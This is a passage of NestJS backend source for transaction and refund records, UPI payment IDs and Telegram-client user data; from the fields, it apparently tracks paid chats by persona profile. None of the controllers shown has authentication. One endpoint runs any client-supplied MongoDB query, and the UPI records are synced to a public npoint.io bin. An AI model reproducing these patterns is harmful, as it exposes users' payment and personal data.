profile ID',\n    example: 'user123',\n    required: false \n  })\n  @IsString()\n  @IsOptional()\n  profile: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'User chat ID',\n    example: 'chat123',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  chatId: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'IP address of the user',\n    example: '192.168.1.1',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  ip: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING,\n    required: false\n  })\n  @IsEnum(TransactionStatus)\n  @IsOptional()\n  status: TransactionStatus = TransactionStatus.PENDING;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document, Schema as MongooseSchema } from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { TransactionStatus } from '../dto/create-transaction.dto';\n\nexport type TransactionDocument = Transaction & Document;\n\n@Schema({\n  collection: 'transactions',\n  versionKey: false,\n  autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret.id = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  }\n})\nexport class Transaction {\n  @ApiProperty({ description: 'Unique transaction ID (UTR)' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true, \n    unique: true,\n    index: true \n  })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction' })\n  @Prop({ \n    type: MongooseSchema.Types.Number, \n    required: true,\n    min: 0 \n  })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true,\n    index: true\n  })\n  issue: string;\n\n  @ApiProperty({ description: 'Description of issue reported by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true \n  })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined',\n    index: true\n  })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    default: 'undefined' \n  })\n  ip: string;\n\n  @ApiProperty({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING\n  })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    enum: Object.values(TransactionStatus),\n    default: TransactionStatus.PENDING,\n    index: true\n  })\n  status: TransactionStatus;\n\n  @ApiProperty({ description: 'Creation timestamp' })\n  @Prop({ type: Date })\n  createdAt?: Date;\n\n  @ApiProperty({ description: 'Last update timestamp' })\n  @Prop({ type: Date })\n  updatedAt?: Date;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n\n// Compound indexes for common query patterns\nTransactionSchema.index({ chatId: 1, status: 1 });\nTransactionSchema.index({ profile: 1, status: 1 });\nTransactionSchema.index({ createdAt: -1 });\nTransactionSchema.index({ amount: 1, status: 1 });\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiParam } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\nimport { Transaction } from './schemas/transaction.schema';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({\n    summary: 'Create a new transaction',\n    description: 'Creates a new transaction record with the provided details'\n  })\n  @ApiResponse({\n    status: HttpStatus.CREATED,\n    description: 'Transaction created successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async create(@Body() createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({\n    summary: 'Get transaction by ID',\n    description: 'Retrieves a specific transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction retrieved successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async findOne(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({\n    summary: 'Get all transactions',\n    description: 'Retrieves all transactions with optional filtering, pagination and sorting'\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transactions retrieved successfully.',\n    type: [Transaction]\n  })\n  @ApiQuery({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' })\n  @ApiQuery({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' })\n  @ApiQuery({ name: 'issue', required: false, description: 'Filter by issue type' })\n  @ApiQuery({ name: 'refundMethod', required: false, description: 'Filter by refund method' })\n  @ApiQuery({ name: 'profile', required: false, description: 'Filter by user profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Filter by chat ID' })\n  @ApiQuery({ name: 'ip', required: false, description: 'Filter by IP address' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by transaction status' })\n  @ApiQuery({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 })\n  @ApiQuery({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 })\n  async findAll(\n    @Query('transactionId') transactionId?: string,\n    @Query('amount') amount?: number,\n    @Query('issue') issue?: string,\n    @Query('refundMethod') refundMethod?: string,\n    @Query('profile') profile?: string,\n    @Query('chatId') chatId?: string,\n    @Query('ip') ip?: string,\n    @Query('status') status?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    return this.transactionService.findAll(\n      { transactionId, amount, issue, refundMethod, profile, chatId, status, ip },\n      limit,\n      offset\n    );\n  }\n\n  @Put(':id')\n  @ApiOperation({\n    summary: 'Update a transaction',\n    description: 'Updates an existing transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction updated successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ): Promise<Transaction> {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({\n    summary: 'Delete a transaction',\n    description: 'Deletes a transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction deleted successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async delete(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports:[TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException, BadRequestException, Logger } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, isValidObjectId } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction, TransactionDocument } from './schemas/transaction.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport e from 'express';\n\n@Injectable()\nexport class TransactionService {\n  private readonly logger = new Logger(TransactionService.name);\n\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<TransactionDocument>,\n  ) { }\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);\n    try {\n      // Check if transaction with same ID already exists\n      const existingTransaction = await this.transactionModel\n        .findOne({ transactionId: createTransactionDto.transactionId })\n        .exec();\n\n      if (existingTransaction) {\n        throw new BadRequestException('Transaction with this ID already exists');\n      }\n\n      const newTransaction = new this.transactionModel(createTransactionDto);\n      const savedTransaction = await newTransaction.save();\n      this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);\n      return savedTransaction;\n    } catch (error) {\n      this.logger.error(`Error creating transaction: ${error.message}`, error.stack);\n      throw error instanceof BadRequestException ? error : new BadRequestException('Failed to create transaction');\n    }\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    this.logger.debug(`Finding transaction by ID: ${id}`);\n    try {\n      const transaction = await this.transactionModel.findById(id).exec();\n      if (!transaction) {\n        this.logger.warn(`Transaction not found with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      return transaction;\n    } catch (error) {\n      this.logger.error(`Error finding transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Invalid transaction ID format');\n    }\n  }\n\n  async findAll(\n    filters: {\n      transactionId?: string;\n      amount?: number;\n      issue?: string;\n      refundMethod?: string;\n      profile?: string;\n      chatId?: string;\n      status?: string;\n      ip?: string;\n    },\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);\n    try {\n      let query = {};\n      let transactions: Transaction[] = [];\n      let total = 0;\n\n      // Check each condition sequentially, only moving to the next if no results are found\n      if (filters.transactionId) {\n        // First check transactionId\n        const transactionIdQuery: any = { \n          $or: [\n            { transactionId: filters.transactionId.toLowerCase() }\n          ] \n        };\n        \n        // Only attempt to query by _id if the ID is a valid MongoDB ObjectId\n        if (isValidObjectId(filters.transactionId)) {\n          transactionIdQuery.$or.push({ _id: filters.transactionId });\n        }\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(transactionIdQuery)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(transactionIdQuery).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.ip) {\n        // Then check IP if no transaction ID match\n        query = { ip: filters.ip };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.chatId) {\n        // Then check chatId if no IP match\n        query = { chatId: filters.chatId };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      // Finally, check remaining filters\n      const remainingFilters = {};\n      \n      if (filters.profile) remainingFilters['profile'] = filters.profile;\n      if (filters.amount) remainingFilters['amount'] = filters.amount;\n      if (filters.issue) remainingFilters['issue'] = filters.issue;\n      if (filters.refundMethod) remainingFilters['refundMethod'] = filters.refundMethod;\n      if (filters.status) remainingFilters['status'] = filters.status;\n      \n      // Only proceed if at least one remaining filter exists\n      if (Object.keys(remainingFilters).length > 0) {\n        query = remainingFilters;\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n      }\n\n      this.logger.debug(`Found ${total} transactions matching remaining filters`);\n      await this.sendNotification(filters, total);\n      return { transactions, total };\n    } catch (error) {\n      this.logger.error(`Error finding transactions: ${error.message}`, error.stack);\n      throw new BadRequestException('Failed to fetch transactions');\n    }\n  }\n\n  // Helper method to send notification\n  private async sendNotification(filters: any, total: number): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\\nchatId: ${filters.chatId || 'N/A'}\\ntransactionId: ${filters.transactionId || 'N/A'}\\nprofile: ${filters.profile || 'N/A'}`)}`);\n    } catch (error) {\n      this.logger.error(`Failed to send notification: ${error.message}`);\n    }\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);\n    try {\n      const updatedTransaction = await this.transactionModel\n        .findByIdAndUpdate(id, updateTransactionDto, {\n          new: true,\n          runValidators: true\n        })\n        .exec();\n\n      if (!updatedTransaction) {\n        this.logger.warn(`Transaction not found for update with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n\n      this.logger.log(`Transaction ${id} updated successfully`);\n      return updatedTransaction;\n    } catch (error) {\n      this.logger.error(`Error updating transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to update transaction');\n    }\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    this.logger.debug(`Deleting transaction: ${id}`);\n    try {\n      const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n      if (!deletedTransaction) {\n        this.logger.warn(`Transaction not found for deletion with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      this.logger.log(`Transaction ${id} deleted successfully`);\n      return deletedTransaction;\n    } catch (error) {\n      this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to delete transaction');\n    }\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService {\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.findOne().then(() => {\n            setInterval(async () => {\n                await this.refreshUPIs();\n                await this.checkNpoint();\n            }, 5 * 60000);\n        });\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshing UPIs\");\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (result) {\n            this.upiIds = result;\n        }\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds;\n        }\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (!result) return null;\n\n        this.upiIds = result;\n        console.log(\"Refreshed UPIs\");\n        return result;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {},\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: '  ', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\n  secondShow?: boolean;\n\n  @ApiPropertyOptional({ description: 'Profile name' })\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n  profile?: string;\n\n  @ApiPropertyOptional({ description: 'Chat ID' })\n  chatId?: string;\n\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\n  picsSent?: boolean;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\nimport { UserDataService } from './user-data.service';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UserData } from './schemas/user-data.schema';\nimport { SearchDto } from './dto/search-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\n\n@ApiTags('UserData of TG clients')\n@Controller('userData')\nexport class UserDataController {\n  constructor(private readonly userDataService: UserDataService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\n    return this.userDataService.create(createUserDataDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'profile', required: false, description: 'User profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Chat ID' })\n  @ApiQuery({ name: 'isTesting', required: false, type: Boolean })\n  @ApiQuery({ name: 'banned', required: false, type: Boolean })\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\n    return this.userDataService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<UserData[]> {\n    return this.userDataService.findAll();\n  }\n\n\n  @Patch('updateAll/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\n  }\n\n\n  @Get(':profile/:chatId')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.findOne(profile, chatId);\n  }\n\n  @Patch(':profile/:chatId')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\n  }\n\n  @Delete(':profile/:chatId')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\n    return this.userDataService.remove(profile, chatId);\n  }\n\n  @Get('clear-count')\n  clearCount(@Query('chatId') chatId?: string) {\n    return this.userDataService.clearCount(chatId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\n        const createdUser = new this.userDataModel(createUserDataDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<UserData[]> {\n        return await this.userDataModel.find().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\n        if (!user) {\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\n        }\n        const currentCount = this.callCounts.get(chatId) || 0;\n        this.callCounts.set(chatId, currentCount + 1);\n        if (user) {\n            return { ...user, count: this.callCounts.get(chatId) };\n        } else {\n            return undefined\n        }\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        } else {\n            this.callCounts.clear();\n            return 'All counts cleared.';\n        }\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\n        delete updateUserDataDto['_id']\n        console.log(updateUserDataDto)\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\n        delete updateUserDataDto['_id']\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            console.warn(`UserData with ID \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserData> {\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\n        if (!deletedUser) {\n            console.warn(`UserData with ID 